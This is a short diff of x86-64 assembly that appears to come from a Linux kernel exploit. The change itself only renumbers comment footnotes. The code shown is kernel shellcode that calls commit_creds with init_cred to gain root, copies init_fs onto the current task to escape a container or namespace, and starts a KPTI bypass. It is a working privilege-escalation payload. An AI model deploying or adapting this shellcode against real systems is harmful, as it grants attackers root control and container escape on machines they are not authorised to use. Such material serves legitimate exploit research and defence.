@@ -12,26 +12,26 @@ a:
     pop r15
     sub r15, 0x241389
 
-    ; commit_creds(init_cred) [3]
+    ; commit_creds(init_cred) [1]
     lea rdi, [r15 + init_cred]
     lea rax, [r15 + commit_creds]
     call rax
 
-    ; new_fs = copy_fs_struct(init_fs) [6]
+    ; new_fs = copy_fs_struct(init_fs) [2]
     lea rdi, [r15 + init_fs]
     lea rax, [r15 + copy_fs_struct]
     call rax
     mov rbx, rax
 
-    ; current = find_task_by_vpid(getpid())
+    ; current = find_task_by_vpid(getpid()) [3]
     mov rdi, 0x1111111111111111     ; will be fixed at runtime
     lea rax, [r15 + find_task_by_vpid]
     call rax
 
-    ; current->fs = new_fs [8]
+    ; current->fs = new_fs [4]
     mov [rax + 0x740], rbx
 
-    ; kpti bypass [9]
+    ; kpti bypass [5]
     xor eax, eax
     mov [rsp+0x00], rax
     mov [rsp+0x08], rax
